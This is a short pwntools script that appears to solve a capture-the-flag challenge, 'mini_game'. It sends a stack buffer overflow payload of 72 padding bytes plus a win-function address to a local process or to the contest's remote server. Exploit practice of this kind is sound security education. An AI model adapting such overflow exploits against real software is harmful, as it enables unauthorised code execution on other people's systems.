#!/usr/bin/env python3

from pwn import *

context.binary = exe = ELF("./mini_game")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it",13516)

    return r

def main():
    p = conn()
    OFFSET = 72
    win_addr = 0x4011fb

    payload = b'A'*72 + p64(win_addr)
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()
